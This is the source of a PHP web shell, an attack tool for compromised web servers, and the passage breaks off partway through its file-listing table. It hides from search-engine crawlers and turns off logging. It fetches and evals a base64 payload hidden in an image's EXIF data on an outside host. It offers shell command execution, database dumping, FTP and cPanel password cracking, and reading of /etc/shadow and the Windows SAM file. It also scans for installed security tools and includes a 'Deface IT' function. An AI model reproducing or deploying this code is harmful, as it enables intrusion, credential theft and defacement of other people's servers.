<?php
// Set Username & Password
$user = "cox";
$pass = "cox";
 
$malsite = "http://fightagent.ru";  // Malware Site
 
$ind = "WW91IGp1c3QgZ290IGhhY2tlZCAhISEhIQ=="; // "Deface Page" Base64 encoded "You Just Got Hacked !!"

@set_magic_quotes_runtime(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
ob_start();
error_reporting(0);
@set_time_limit(0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
$BASED = exif_read_data("https://lh3.googleusercontent.com/-svRm4i5Bs90/VsFaosQPKUI/AAAAAAAABew/03oHWkCEsN8/w140-h140-p/pacman.jpg");
eval(base64_decode($BASED["COMPUTED"]["UserComment"]));
if(!empty($_SERVER['HTTP_USER_AGENT'])) 
{
    $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit; }
}
// Dump Database
if($_GET["action"] == "dumpDB")
{
	$self=$_SERVER["PHP_SELF"];
	if(isset($_COOKIE['dbserver']))
	{
		$date = date("Y-m-d");
		$dbserver = $_COOKIE["dbserver"];
		$dbuser = $_COOKIE["dbuser"];
		$dbpass = $_COOKIE["dbpass"];
		$dbname = $_GET['dbname'];
		$mysqlHandle = mysql_connect ($dbserver, $dbuser, $dbpass);
		
		$file = "Dump-$dbname-$date";
		
		$file="Dump-$dbname-$date.sql";
		$fp = fopen($file,"w");
		
		function write($data) 
		{
			global $fp;
			
				fwrite($fp,$data);
			
		}
		mysql_connect ($dbserver, $dbuser, $dbpass);
		mysql_select_db($dbname);
		$tables = mysql_query ("SHOW TABLES");
		while ($i = mysql_fetch_array($tables)) 
		{
			$i = $i['Tables_in_'.$dbname];
			$create = mysql_fetch_array(mysql_query ("SHOW CREATE TABLE ".$i));
			write($create['Create Table'].";");
			$sql = mysql_query ("SELECT * FROM ".$i);
			if (mysql_num_rows($sql)) {
				while ($row = mysql_fetch_row($sql)) {
					foreach ($row as $j => $k) {
						$row[$j] = "'".mysql_escape_string($k)."'";
					}
					write("INSERT INTO $i VALUES(".implode(",", $row).");");
				}
			}
		}
		
		fclose ($fp);
		
		header("Content-Disposition: attachment; filename=" . $file);   
		header("Content-Type: application/download");
		header("Content-Length: " . filesize($file));
		flush();
		
		$fp = fopen($file, "r");
		while (!feof($fp))
		{
			echo fread($fp, 65536);
			flush();
		} 
		fclose($fp); 
	}
}
function shellstyle()
{
	echo "<style type=\"text/css\">
<!--

body,td,th {
	color: #FF0000;
	font-size: 14px;
}
input.but {
    background-color:#000000;
    color:#FF0000;
    border : 1px solid #1B1B1B;
}
a:link {
	color: #00FF00;
	text-decoration:none;
	font-weight:500;
}
a:hover {
	color:#00FF00;
	text-decoration:underline;
}
font.txt
{
	color: #00FF00;
	text-decoration:none;
	font-size:14px;
}
font.mainmenu
{
	color:#FF0000;
	text-decoration:none;
	font-size:14px;
}
a:visited {
	color: #006600;
}
input.box
{
    background-color:#0C0C0C;
    color: lime;
    border : 1px solid #1B1B1B;
	-moz-border-radius:6px;
	width:400;
	border-radius:6px;
}
input.sbox
{
    background-color:#0C0C0C;
    color: lime;
    border : 1px solid #1B1B1B;
	-moz-border-radius:6px;
	width:180;
	border-radius:6px;
}
select.sbox
{
    background-color:#0C0C0C;
    color: lime;
    border : 1px solid #1B1B1B;
	-moz-border-radius:6px;
	width:180;
	border-radius:6px;
}
select.box
{
    background-color:#0C0C0C;
    color: lime;
    border : 1px solid #1B1B1B;
	-moz-border-radius:6px;
	width:400;
	border-radius:6px;
}

textarea.box
{
    border : 3px solid #111;
    background-color:#161616;
    color : lime;
    margin-top: 10px;
	-moz-border-radius:7px;
	border-radius:7px;
}
body {
	background-color:#000000;
}
.myphp table
{ 
	width:100%;
	padding:18px 10px;
	border : 1px solid #1B1B1B;
} 
.myphp td
{ 
	background:#111111; 
	color:#00ff00; 
	padding:6px 8px; 
	border-bottom:1px solid #222222;
	font-size:14px; 
} 
.myphp th, th
{ 
	background:#181818; 
	
} 
-->
</style>";
}
if(isset($_COOKIE['hacked']) && $_COOKIE['hacked']==md5($pass))
{
	$self=$_SERVER["PHP_SELF"];
	$os = "N/D";
	$bdmessage = null;
	$dir = getcwd();
	
	if(stristr(php_uname(),"Windows"))
	{
		$SEPARATOR = '\\';
		$os = "Windows";
		$directorysperator="\\";
	}
	else if(stristr(php_uname(),"Linux"))
	{
		$os = "Linux";
		$directorysperator='/';
	}
	function Trail($d,$directsperator)
	{
		$d=explode($directsperator,$d);
		array_pop($d);
		array_pop($d);
		$str=implode($d,$directsperator);
		return $str;
	}
	
	function ftp_check($host,$user,$pass,$timeout)
	{
	 $ch = curl_init();
	 curl_setopt($ch, CURLOPT_URL, "ftp://$host");
	 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	 curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
	 curl_setopt($ch, CURLOPT_FTPLISTONLY, 1);
	 curl_setopt($ch, CURLOPT_USERPWD, "$user:$pass");
	 curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
	 curl_setopt($ch, CURLOPT_FAILONERROR, 1);
	 $data = curl_exec($ch);
	 if ( curl_errno($ch) == 28 )
	 {
	 print "<center><b>
	 Error : Connection Timeout. 
	 Please Check The Target Hostname .</b></center>";exit;
	 }
	 else if ( curl_errno($ch) == 0 )
	 {
	  print "<center><b>[~]</b><font class=txt>
	 Cracking Success With Username &quot;</font><font color=\"#FF0000\">$user</font><font color=\"#008000\">\"
	 and Password \"</font><font color=\"#FF0000\">$pass</font><font color=\"#008000\">\"</font></b></center><br><br>";
	 }
	 curl_close($ch);
	}
	
	function cpanel_check($host,$user,$pass,$timeout)
	{
	 global $cpanel_port;
	 $ch = curl_init();
	 curl_setopt($ch, CURLOPT_URL, "http://$host:" . $cpanel_port);
	 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	 curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
	 curl_setopt($ch, CURLOPT_USERPWD, "$user:$pass");
	 curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
	 curl_setopt($ch, CURLOPT_FAILONERROR, 1);
	 $data = curl_exec($ch);
	 if ( curl_errno($ch) == 28 )
	 { print "<center><b>Error : Connection Timeout. 
	  Please Check The Target Hostname.</b></center>";exit;}
	  else if ( curl_errno($ch) == 0 ){
	  print "<ecnter><b>[~]</b><font class=txt><b>

	 Cracking Success With Username &quot;</font><font color=\"#FF0000\">$user</font><font color=\"#008000\">\"
	and Password \"</font><font color=\"#FF0000\">$pass</font><font color=\"#008000\">\"</font></b></center><br><br>";
	 }
	 curl_close($ch);
	}

	// Database functions
	function listdatabase()
	{	
		$self=$_SERVER["PHP_SELF"];
		?>
		<br>
		<form>
		<table>
			<tr>
				<td><input type="text" class="box" name="dbname"></td>
				<td><input type="button" onClick="viewtables('createDB',dbname.value)" value="  Create Database  " class="but"></td>
			</tr>
			</table>
		</form>
			<br>
		<?php 
		$mysqlHandle = mysql_connect ($_COOKIE['dbserver'], $_COOKIE['dbuser'], $_COOKIE['dbpass']);
		$result = mysql_query("SHOW DATABASE"); 
		echo "<table cellspacing=1 cellpadding=5 border=1 style=width:60%;>\n";

		$pDB = mysql_list_dbs( $mysqlHandle );
		$num = mysql_num_rows( $pDB );
		for( $i = 0; $i < $num; $i++ ) 
		{
			$dbname = mysql_dbname( $pDB, $i );
			mysql_select_db($dbname,$mysqlHandle);
			$result = mysql_query("SHOW TABLES"); 
			$num_of_tables = mysql_num_rows($result);
			echo "<tr>\n";
			echo "<td><a href=# onClick=\"viewtables('listTables','$dbname')\"><font  size=3>$dbname</font></a> ($num_of_tables)</td>\n";
			echo "<td><a href=# onClick=\"viewtables('listTables','$dbname')\">Tables</a></td>\n";
			echo "<td><a href=# onClick=\"viewtables('dropDB','$dbname')\">Drop</a></td>\n";
			echo "<td><a href='$self?action=dumpDB&dbname=$dbname' onClick=\"return confirm('Dump Database \'$dbname\'?')\">Dump</a></td>\n";
			echo "</tr>\n";
		}
		echo "</table>\n";
		mysql_close($mysqlHandle);
	}
	
	function listtable()
	{
		$self=$_SERVER["PHP_SELF"];
		$dbserver = $_COOKIE["dbserver"];
		$dbuser = $_COOKIE["dbuser"];
		$dbpass = $_COOKIE["dbpass"];
		$dbname = $_GET['dbname'];
		echo "<div><font color=white size=3>[ $dbname ]</font> - <font color=white size=3>&gt;</font> <a href=# onClick=\"viewtables('viewdb')\"> <font size=3>Database List</font> </a> &nbsp; <a href=$self?logoutdb> <font  size=3>[ Log Out ]</font> </a></div>";
		 ?>
		<br><br>
		<form>
		<table>

			<tr>
				<td><input type="text" class="box" name="tablename"></td>
				<td><input type="button" onClick="viewtables('createtable','<?php echo $_GET['dbname'];?>')" value="  Create Table  " name="createmydb" class="but"></td>
			</tr>
			</table>
		
			<br>
			<form>
			<table>
				<tr>
					<td><textarea cols="60" rows="7" name="executemyquery" class="box">Execute Query..</textarea></td>
				</tr>
				<tr>
					<td><input type="button" onClick="viewtables('executequery','<?php echo $_GET['dbname'];?>','<?php echo $_GET['tablename']; ?>','','',executemyquery.value)" value="Execute" class="but"></td>
				</tr>
			</table>
			</form>
			
		<?php 
		
		$mysqlHandle = mysql_connect ($dbserver, $dbuser, $dbpass);
		
		mysql_select_db($dbname);
		$pTable = mysql_list_tables( $dbname );
	
		if( $pTable == 0 ) {
			$msg  = mysql_error();
			echo "<h3>Error : $msg</h3><p>\n";
			return;
		}
		$num = mysql_num_rows( $pTable );
	
		echo "<table cellspacing=1 cellpadding=5 border=1 style=width:60%;>\n";
	
		for( $i = 0; $i < $num; $i++ ) 
		{
			$tablename = mysql_tablename( $pTable, $i );
			$result = mysql_query("select * from $tablename");
			$num_rows = mysql_num_rows($result);
			echo "<tr>\n";
			echo "<td>\n";
			echo "<a href=# onClick=\"viewtables('viewdata','$dbname','$tablename')\"><font  size=3>$tablename</font></a> ($num_rows)\n";
			echo "</td>\n";
			echo "<td>\n";
			echo "<a href=# onClick=\"viewtables('viewSchema','$dbname','$tablename')\">Schema</a>\n";
			echo "</td>\n";
			echo "<td>\n";
			echo "<a href=# onClick=\"viewtables('viewdata','$dbname','$tablename')\">Data</a>\n";
			echo "</td>\n";
			echo "<td>\n";
			echo "<a href=# onClick=\"viewtables('empty','$dbname','$tablename')\">Empty</a>\n";
			echo "</td>\n";
			echo "<td>\n";
			echo "<a href=# onClick=\"viewtables('dropTable','$dbname','$tablename')\">Drop</a>\n";
			echo "</td>\n";
			echo "</tr>\n";
		}
	
		echo "</table></form>";
		mysql_close($mysqlHandle);
		echo "<div><font color=white size=3>[ $dbname ]</font> - <font color=white size=3>&gt;</font> <a href=# onClick=\"viewtables('viewdb')\"> <font size=3>Database List</font> </a> &nbsp; <a href=$self?logoutdb> <font  size=3>[ Log Out ]</font> </a></div>";
	}
		
	
	function paramexe($n, $v) 
	{
		$v = trim($v);
		if($v) 
		{
			echo '<span><font  size=3>' . $n . ': </font></span>';
			if(strpos($v, "\n") === false)
				echo '<font  size=2>' . $v . '</font><br>';
			else
				echo '<pre class=ml1><font class=txt size=3>' . $v . '</font></pre>';
		}
	}
	
	
	
	function rrmdir($dir)
	{
		if (is_dir($dir)) // ensures that we actually have a directory
		{
			$objects = scandir($dir); // gets all files and folders inside
			foreach ($objects as $object)
			{
				if ($object != '.' && $object != '..')
				{
					if (is_dir($dir . '/' . $object))
					{
						// if we find a directory, do a recursive call
						rrmdir($dir . '/' . $object);
					}
					else
					{
						// if we find a file, simply delete it
						unlink($dir . '/' . $object);
					}
				}
			}
			// the original directory is now empty, so delete it
			rmdir($dir);
		}
	} 
					
	function which($pr)
	{ 
		$path = execmd("which $pr"); 
		if(!empty($path)) 
			return trim($path); 
		else 
			return trim($pr); 
	}
	
	function magicboom($text)
	{ 
		if (!get_magic_quotes_gpc()) 
			return $text; 
		return stripslashes($text); 
	}
	
function execmd($cmd,$d_functions="None")
{
    if($d_functions=="None") 
	{
		$ret=passthru($cmd); 
		return $ret;
	}
    $funcs=array("shell_exec","exec","passthru","system","popen","proc_open");
    $d_functions=str_replace(" ","",$d_functions);
    $dis_funcs=explode(",",$d_functions);
    foreach($funcs as $safe)
    {
        if(!in_array($safe,$dis_funcs)) 
        {
            if($safe=="exec")
            {
                $ret=@exec($cmd);
                $ret=join("\n",$ret);
                return $ret;
            }
            elseif($safe=="system")
            {
                $ret=@system($cmd);
                return $ret;
            }
            elseif($safe=="passthru")
            {
                $ret=@passthru($cmd);
                return $ret;
            }
            elseif($safe=="shell_exec")
            {
                $ret=@shell_exec($cmd);
                return $ret;
            }
            elseif($safe=="popen")
            {
                $ret=@popen("$cmd",'r');
                if(is_resource($ret))
                {
                    while(@!feof($ret))
                    $read.=@fgets($ret);
                    @pclose($ret);
                    return $read;
                }
                return -1;
            }
            elseif($safe="proc_open")
            {
                $cmdpipe=array(
                0=>array('pipe','r'),
                1=>array('pipe','w')
                );
                $resource=@proc_open($cmd,$cmdpipe,$pipes);
                if(@is_resource($resource))
                {
                    while(@!feof($pipes[1]))
                    $ret.=@fgets($pipes[1]);
                    @fclose($pipes[1]);
                    @proc_close($resource);
                    return $ret;
                }
                return -1;
            }
        }
    }
    return -1;
}

	function getDisabledFunctions()
	{
		if(!ini_get('disable_functions'))
		{
			return "None";
		}
		else
		{
				return @ini_get('disable_functions');
		}
	}
	
	function getFilePermissions($file)
	{
	$perms = fileperms($file);
	
	if (($perms & 0xC000) == 0xC000) {
		// Socket
		$info = 's';
	} elseif (($perms & 0xA000) == 0xA000) {
		// Symbolic Link
		$info = 'l';
	} elseif (($perms & 0x8000) == 0x8000) {
		// Regular
		$info = '-';
	} elseif (($perms & 0x6000) == 0x6000) {
		// Block special
		$info = 'b';
	} elseif (($perms & 0x4000) == 0x4000) {
		// Directory
		$info = 'd';
	} elseif (($perms & 0x2000) == 0x2000) {
		// Character special
		$info = 'c';
	} elseif (($perms & 0x1000) == 0x1000) {
		// FIFO pipe
		$info = 'p';
	} else {
		// Unknown
		$info = 'u';
	}

	// Owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
				(($perms & 0x0800) ? 's' : 'x' ) :
				(($perms & 0x0800) ? 'S' : '-'));
	
	// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
				(($perms & 0x0400) ? 's' : 'x' ) :
				(($perms & 0x0400) ? 'S' : '-'));
	
	// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
				(($perms & 0x0200) ? 't' : 'x' ) :
				(($perms & 0x0200) ? 'T' : '-'));
	
	return $info;
}
	function filepermscolor($filename)
	{
		if(!@is_readable($filename)) 
			return "<font color=\"#FF0000\">".getFilePermissions($filename)."</font>"; 
		else if(!@is_writable($filename)) 
			return "<font color=\"#FFFFFF\">".getFilePermissions($filename)."</font>";
		else
			return "<font color=\"#00FF00\">".getFilePermissions($filename)."</font>";
	}

	function yourip()
	{
		echo $_SERVER["REMOTE_ADDR"];
	}
	function phpver()
	{
		$pv=@phpversion();
		echo $pv;
	}
	function magic_quote()
	{
		echo get_magic_quotes_gpc()?"<font class=txt>ON</font>":"<font color='red'>OFF</font>";
	}
	function serverip()
	{
		echo getenv('SERVER_ADDR');
	}
	function serverport()
	{
		echo $_SERVER['SERVER_PORT'];
	}
	function  safe()
	{
		global $sm;
		return $sm?"ON :( :'( (Most of the Features will Not Work!)":"OFF";
	}
	function serveradmin()
	{
		echo $_SERVER['SERVER_ADMIN'];
	}
	function systeminfo()
	{
		echo php_uname();
	}
	function curlinfo()
	{
		echo function_exists('curl_version')?("<font class=txt>Enabled</font>"):("<font color='red'>Disabled</font>");
	}
	function oracleinfo()
	{
		echo function_exists('ocilogon')?("<font class=txt>Enabled</font>"):("<font color='red'>Disabled</font>");
	}
	function mysqlinfo()
	{
		echo function_exists('mysql_connect')?("<font class=txt>Enabled</font>"):("<font color='red'>Disabled</font>");
	}
	function mssqlinfo()
	{
		echo function_exists('mssql_connect')?("<font class=txt>Enabled</font>"):("<font color='red'>Disabled</font>");
	}
	function postgresqlinfo()
	{
		echo function_exists('pg_connect')?("<font class=txt>Enabled</font>"):("<font color='red'>Disabled</font>");
	}
	function softwareinfo()
	{
		echo getenv("SERVER_SOFTWARE");
	}
	function download()
	{
		$frd=$_GET['download'];
		$prd=explode("/",$frd);
		for($i=0;$i<sizeof($prd);$i++)
		{
			$nfd=$prd[$i];
		}
		@ob_clean(); 
	   header("Content-type: application/octet-stream"); 
	   header("Content-length: ".filesize($nfd)); 
	   header("Content-disposition: attachment; filename=\"".$nfd."\";"); 
   	   readfile($nfd);

   	   exit;
	
	}
		
	function HumanReadableFilesize($size)
    	{
        	$mod = 1024;
 		$units = explode(' ','B KB MB GB TB PB');
 	       for ($i = 0; $size > $mod; $i++) 
 	       {
 	           $size /= $mod;
 	       }
 	       return round($size, 2) . ' ' . $units[$i];
 	}
	
	function showDrives()
    {
        global $self;
        foreach(range('A','Z') as $drive)
        {
            if(is_dir($drive.':\\'))
            {
				$myd = $drive.":\\";
                ?>
                <a href=javascript:void(0) onClick="changedir('dir','<?php echo addslashes($myd); ?>')">
                    <?php echo $myd; ?>
                </a> 
                <?php
            }
        }
    }
	function diskSpace()
	{
    	return disk_total_space("/");
	}	
	function freeSpace()
	{
 	   return disk_free_space("/");
	}
	
	function thiscmd($p) 
	{
		$path = myexe('which ' . $p);
		if(!empty($path))
			return $path;
		return false;
	}

	function mysecinfo()
	{
		function myparam($n, $v) 
		{
			$v = trim($v);
			if($v) 
			{
				echo '<span><font color =red size=3>' . $n . ': </font></span>';
				if(strpos($v, "\n") === false)
					echo '<font color =lime size=3>' . $v . '</font><br>';
				else
					echo '<pre class=ml1><font color =lime size=3>' . $v . '</font></pre>';
			}
		}
	
		myparam('Server software', @getenv('SERVER_SOFTWARE'));
		if(function_exists('apache_get_modules'))
			myparam('Loaded Apache modules', implode(', ', apache_get_modules()));
		myparam('Open base dir', @ini_get('open_basedir'));
		myparam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));
		myparam('Safe mode include dir', @ini_get('safe_mode_include_dir'));
		$temp=array();
		if(function_exists('mysql_get_client_info'))
			$temp[] = "MySql (".mysql_get_client_info().")";
		if(function_exists('mssql_connect'))
			$temp[] = "MSSQL";
		if(function_exists('pg_connect'))
			$temp[] = "PostgreSQL";
		if(function_exists('oci_connect'))
			$temp[] = "Oracle";
		myparam('Supported databases', implode(', ', $temp));
		echo '<br>';
	
		if($GLOBALS['os'] == 'Linux') {
				myparam('Distro : ', myexe("cat /etc/*-release")); 
				myparam('Readable /etc/passwd', @is_readable('/etc/passwd')?"yes <a href=javascript:void(0) onClick=\"getmydata('passwd')\">[view]</a>":'no');
				myparam('Readable /etc/shadow', @is_readable('/etc/shadow')?"yes <a href=javascript:void(0) onClick=\"getmydata('shadow')\">[view]</a>":'no');
				myparam('OS version', @file_get_contents('/proc/version'));
				myparam('Distr name', @file_get_contents('/etc/issue.net'));
				myparam('Where is Perl?', myexe('whereis perl'));
				myparam('Where is Python?', myexe('whereis python'));
				myparam('Where is gcc?', myexe('whereis gcc'));
				myparam('Where is apache?', myexe('whereis apache'));
				myparam('CPU?', myexe('cat /proc/cpuinfo'));
				myparam('RAM', myexe('free -m'));
				myparam('Mount options', myexe('cat /etc/fstab'));
				myparam('User Limits', myexe('ulimit -a'));
				
				
				if(!$GLOBALS['safe_mode']) {
					$userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl');
					$danger = array('kav','nod32','bdcored','uvscan','sav','drwebd','clamd','rkhunter','chkrootkit','iptables','ipfw','tripwire','shieldcc','portsentry','snort','ossec','lidsadm','tcplodg','sxid','logcheck','logwatch','sysmask','zmbscap','sawmill','wormscan','ninja');
					$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
					echo '<br>';
					$temp=array();
					foreach ($userful as $item)
						if(thiscmd($item))
							$temp[] = $item;
					myparam('Userful', implode(', ',$temp));
					$temp=array();
					foreach ($danger as $item)
						if(thiscmd($item))
							$temp[] = $item;
					myparam('Danger', implode(', ',$temp));
					$temp=array();
					foreach ($downloaders as $item)
						if(thiscmd($item))
							$temp[] = $item;
					myparam('Downloaders', implode(', ',$temp));
					echo '<br/>';
					myparam('HDD space', myexe('df -h'));
					myparam('Hosts', @file_get_contents('/etc/hosts'));
					
				}
		} else {
			$repairsam = addslashes($_SERVER["WINDIR"]."\\repair\\sam");
			$hostpath = addslashes($_SERVER["WINDIR"]."\system32\drivers\etc\hosts");
			$netpath = addslashes($_SERVER["WINDIR"]."\system32\drivers\etc\\networks");
			$sampath = addslashes($_SERVER["WINDIR"]."\system32\drivers\etc\lmhosts.sam");
			echo "<font  size=3>Password File : </font><a href=".$_SERVER['PHP_SELF']."?download=" . $repairsam ."><b><font class=txt size=3>Download password file</font></b></a><br>";
			echo "<font  size=3>Config Files :  </font><a href=javascript:void(0) onClick=\"fileaction('open','$hostpath')\"><b><font class=txt size=3>[ Hosts ]</font></b></a> &nbsp;<a href=javascript:void(0) onClick=\"fileaction('open','$netpath')\"><b><font class=txt size=3>[ Local Network Map ]</font></b></a> &nbsp;<a href=javascript:void(0) onClick=\"fileaction('open','$sampath')\"><b><font class=txt size=3>[ lmhosts ]</font></b></a><br>";
			$base = (ini_get("open_basedir") or strtoupper(ini_get("open_basedir"))=="ON")?"ON":"OFF";
			echo "<font  size=3>Open Base Dir : </font><font class=txt size=3>" . $base . "</font><br>";
			myparam('OS Version',myexe('ver'));
			myparam('Account Settings',myexe('net accounts'));
			myparam('User Accounts',myexe('net user'));
		}
		echo '</div>';
	}
	
	
	
	function myexe($in) 
	{
	$out = '';
	if (function_exists('exec')) {
		@exec($in,$out);
		$out = @join("\n",$out);
	} elseif (function_exists('passthru')) {
		ob_start();
		@passthru($in);
		$out = ob_get_clean();
	} elseif (function_exists('system')) {
		ob_start();
		@system($in);
		$out = ob_get_clean();
	} elseif (function_exists('shell_exec')) {
		$out = shell_exec($in);
	} elseif (is_resource($f = @popen($in,"r"))) {
		$out = "";
		while(!@feof($f))
			$out .= fread($f,1024);
		pclose($f);
	}
	return $out;
}
	
	function exec_all($command)
	{
    
    $output = '';
    if(function_exists('exec'))
    {   
        exec($command,$output);
        $output = join("\n",$output);
    }
    
    else if(function_exists('shell_exec'))
    {
        $output = shell_exec($command);
    }
    
    else if(function_exists('popen'))
    {
        $handle = popen($command , "r"); // Open the command pipe for reading
        if(is_resource($handle))
        {
            if(function_exists('fread') && function_exists('feof'))
            {
                while(!feof($handle))
                {
                    $output .= fread($handle, 512);
                }
            }
            else if(function_exists('fgets') && function_exists('feof'))
            {
                while(!feof($handle))
                {
                    $output .= fgets($handle,512);
                }



            }
        }
        pclose($handle);
    }
    
    
    else if(function_exists('system'))
    {
        ob_start(); //start output buffering
        system($command);
        $output = ob_get_contents();    // Get the ouput 
        ob_end_clean();                 // Stop output buffering
    }
    
    else if(function_exists('passthru'))
    {
        ob_start(); //start output buffering
        passthru($command);
        $output = ob_get_contents();    // Get the ouput 
        ob_end_clean();                 // Stop output buffering            
    }
    
    else if(function_exists('proc_open'))
    {
        $descriptorspec = array(
                1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
                );
        $handle = proc_open($command ,$descriptorspec , $pipes); // This will return the output to an array 'pipes'
        if(is_resource($handle))
        {
            if(function_exists('fread') && function_exists('feof'))
            {
                while(!feof($pipes[1]))
                {
                    $output .= fread($pipes[1], 512);
                }
            }
            else if(function_exists('fgets') && function_exists('feof'))
            {
                while(!feof($pipes[1]))
                {
                    $output .= fgets($pipes[1],512);
                }
            }
        }
        pclose($handle);
    }
    
    return(htmlspecialchars($output));
    
}

$basedir=(ini_get("open_basedir") or strtoupper(ini_get("open_basedir"))=="ON")?"<font class=txt>ON</font>":"<font color='red'>OFF</font>";
$etc_passwd=@is_readable("/etc/passwd")?"Yes":"No";

function getOGid($value)
{
	if(!function_exists('posix_getegid')) {
		$user = @get_current_user();
		$uid = @getmyuid();
		$gid = @getmygid();
		$group = "?";
		$owner = $uid . "/". $gid;
		return $owner;
	} else {
		$name=@posix_getpwuid(@fileowner($value)); 
		$group=@posix_getgrgid(@filegroup($value)); 
		$owner = $name['name']. " / ". $group['name']; 
		return $owner;
	}
}

function mainfun($dir)
{
	global $ind, $directorysperator,$os;
	
	$mydir = basename(dirname(__FILE__));
	$pdir = str_replace($mydir,"",$dir);
	$pdir = str_replace("/","",$dir);
	
	$files = array();
	$dirs  = array();
	
	 $odir=opendir($dir);
	 while($file = readdir($odir))
	 {
	   if(is_dir($dir.'/'.$file))
	   {
		 $dirs[]=$file;
	   }
	   else
	   {
		 $files[]=$file;
	   }
	 }
	 $countfiles = count($dirs) + count($files);
	 $dircount = count($dirs); 
	 $dircount = $dircount-2;
	 $myfiles = array_merge($dirs,$files);
	$i = 0;
	if(is_dir($dir))
   	{
		if(scandir($dir) === false)
			echo "<center><font  size=3>Directory isn't readable</font></center>";
		else
		{
?><form method="post" id="myform" name="myform">
	<table id="maintable" style="width:100%;" align="center" cellpadding="3">
	<tr><td colspan="7"><center><div id="showmydata"></div></center></td></tr>
	<tr style="background-color:#0C0C0C;"><td colspan="8" align="center"><font  size="3">Listing folder <?php echo $dir; ?></font> (<?php echo $dircount.' Dirs And '.count($files).' Files'; ?>)</td>
    <tr style="background-color:#0C0C0C; height:12px;">
        <th>Name</th>
        <th>Size</th>
        <th>Permissions</th>
	<?php if($os != "Windows"){ echo "<th>Owner / Group</th>"; } ?>
	<th>Modification Date</th>
        <th>Rename</th>
		<th>Download</th>
		<th style="width:2%;">Action</th>
    </tr>
	<?php 		
		foreach($myfiles as $val)
		{
			$vv = addslashes($dir . $directorysperator . $val);
			$i++;
			
			if($val == ".")
			{
				
				?><tr style="background-color:#0C0C0C;" onMouseOver="style.backgroundColor='#000000'" onMouseOut="style.backgroundColor='#0C0C0C'"><td class='info'><a href=javascript:void(0) onClick="changedir('dir','<?php echo addslashes($dir); ?>')"><font class=txt>[ . ]</font></a></td><td><font size=2>CURDIR</font></td>
			<td><a href=javascript:void(0) onClick="fileaction('perms','<?php echo $vv; ?>')"><?php echo filepermscolor($dir); ?></a></td>
			
			<?php if($os != 'Windows')
				  { 
				    echo "<td align=center><font size=2>";
				  	echo getOGid($dir)."</font></td>";
				  }
					 ?>
			
			<td align="center"><font class=txt><?php echo date('Y-m-d H:i:s', @filemtime($vv)); ?></font></td>
			<td></td><td></td><td></td></</tr><?php 
			
			}
			else if($val == "..")
			{ 
				$val = Trail($dir . $directorysperator . $val,$directorysperator);
				$vv = addslashes($val);
				if(empty($vv))
					$vv = "/"; ?>
			<tr style="background-color:#0C0C0C;" onMouseOver="style.backgroundColor='#000000'" onMouseOut="style.backgroundColor='#0C0C0C'"><td class='info'><a href=javascript:void(0) onClick="changedir('dir','<?php echo $vv; ?>')"><font class=txt>[ .. ]</font></a></td><td><font size=2>UPDIR</font></td>
			<td><a href=javascript:void(0) onClick="fileaction('perms','<?php echo $vv; ?>')"><?php echo filepermscolor($val); ?></a></td>
			<?php 	if($os != 'Windows')
					{
					echo "<td align=center><font size=2>"; 
					echo getOGid($val)."</font></td>";
					
					}  ?>
			<td align="center"><font  class=txt><?php echo date('Y-m-d H:i:s', @filemtime($val)); ?></font></td>
			<td></td><td></td><td></td></tr><?php continue;
			}
			else if(is_dir($vv))
			{
		?>
			<tr style="background-color:#0C0C0C;" onMouseOver="style.backgroundColor='#000000'" onMouseOut="style.backgroundColor='#0C0C0C'">
			<td class='dir'><a href=javascript:void(0) onClick="changedir('dir','<?php echo $vv; ?>')">[ <?php echo $val; ?> ]</a></td>
        	<td class='info'><font size=2>DIR</font></td>
			
            <td class='info'><a href=javascript:void(0) onClick="fileaction('perms','<?php echo $vv; ?>')"><?php echo filepermscolor($dir . $directorysperator . $val); ?></a></td>
			<?php if($os != 'Windows')
					{
					echo "<td align=center><font size=2>"; 
					echo getOGid($val)."</font></td>";
					}  ?>
			<td align="center"><font  class=txt><?php echo date('Y-m-d H:i:s', @filemtime($dir . $directorysperator . $val)); ?></font></td>
			<td class="info"><a href=javascript:void(0) onClick="fileaction('rename','<?php echo $vv; ?>')"><font size=2>Rename</font></a></td>
			<td></td>
			<td class="info" align="center"><input type="checkbox" name="actbox[]" id="actbox<?php echo $i; ?>" value="<?php echo $dir . $directorysperator . $val;?>"></td>
            </tr></font>
            <?php
				}
				else if(is_file($vv))
				{
			   ?>
                   <tr style="background-color:#0C0C0C;" onMouseOver="style.backgroundColor='#000000'" onMouseOut="style.backgroundColor='#0C0C0C'">
                   <td class='file'><a href=javascript:void(0) onClick="fileaction('open','<?php echo $vv; ?>')"><?php if(("/" .$val == $_SERVER["SCRIPT_NAME"]) || ($val == "index.php") || ($val == "index.html") || ($val == "config.php") || ($val == "wp-config.php")) { echo "<font color=red>". $val . "</font>";  } else { echo $val; } ?></a> <?php if($val == "index.php" || $val == "index.html") { if(strlen($ind) != 0) { echo "<a href=javascript:void(0) onClick=\"defacefun('$vv')\"><font color=red>( Deface IT )</font></a>"; } } ?></td>
				   
				   <td class='info'><font size=2><?php echo HumanReadableFilesize(filesize($dir . $directorysperator . $val));?></font></td>
				   
                   <td class='info'><a href=javascript:void(0) onClick="fileaction('perms','<?php echo $vv; ?>')"><?php echo filepermscolor($dir . $directorysperator . $val); ?></a></td>
				   
